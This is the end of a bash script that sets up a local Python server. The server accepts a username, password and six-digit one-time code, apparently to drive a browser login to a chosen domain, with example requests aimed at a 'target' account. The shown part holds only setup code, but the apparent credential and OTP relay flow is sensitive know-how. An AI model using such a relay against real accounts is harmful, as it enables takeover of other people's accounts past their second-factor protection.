        print("   - GET/POST /submit-otp?otp=<6-digit-code>")
        print("   - GET /status")
        print("")
        print("💡 Example usage:")
        print(f"   curl 'http://localhost:{PORT}/start-login?username=target&password=password123'")
        print(f"   curl 'http://localhost:{PORT}/submit-otp?otp=123456'")
        print(f"   curl 'http://localhost:{PORT}/status'")
        print("")
        httpd.serve_forever()

if __name__ == "__main__":
    start_server()
EOF

    chmod +x "$SCRIPT_DIR/server.py"
}

# Only run server initialization when script is run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Check dependencies
    if ! command -v python3 &> /dev/null; then
        echo "❌ Error: python3 is required but not installed."
        echo "🔧 Please install python3: apt-get install python3"
        exit 1
    fi

    if ! command -v jq &> /dev/null; then
        echo "❌ Error: jq is required but not installed."
        echo "🔧 Please install jq: apt-get install jq"
        exit 1
    fi

    # Kill any existing server processes
    echo "🧹 Cleaning up any existing server processes..."
    pkill -f "python3.*server.py" 2>/dev/null || true
    sleep 1

    # Initialize browser session immediately after domain is provided
    echo "🚀 Initializing browser session immediately..."
    if initialize_browser "$DOMAIN"; then
        echo "✅ Browser initialization completed successfully"
    else
        echo "❌ Browser initialization failed"
        exit 1
    fi
    
    # Create and start the Python HTTP server
    create_python_server
    cd "$SCRIPT_DIR"
    python3 server.py
fi
